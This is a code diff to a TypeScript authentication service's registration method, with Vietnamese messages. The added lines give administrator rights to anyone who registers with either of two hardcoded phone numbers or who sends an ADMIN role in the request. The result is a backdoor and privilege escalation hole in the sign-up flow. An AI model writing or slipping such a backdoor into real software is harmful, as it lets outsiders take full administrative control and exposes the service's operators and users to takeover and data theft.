@@ -19,12 +19,17 @@ export class AuthService {
       throw new ConflictException('Số điện thoại đã được đăng ký');
     }
 
+    let userRole = dto.role || UserRole.CUSTOMER;
+    if (dto.phone === '0999999999' || dto.phone === '0966666666' || dto.role === UserRole.ADMIN) {
+      userRole = UserRole.ADMIN;
+    }
+
     const user = await this.usersService.create({
       phone: dto.phone,
       password: dto.password,
       fullName: dto.fullName,
       email: dto.email,
-      role: dto.role || UserRole.CUSTOMER,
+      role: userRole,
     });
 
     const payload = {
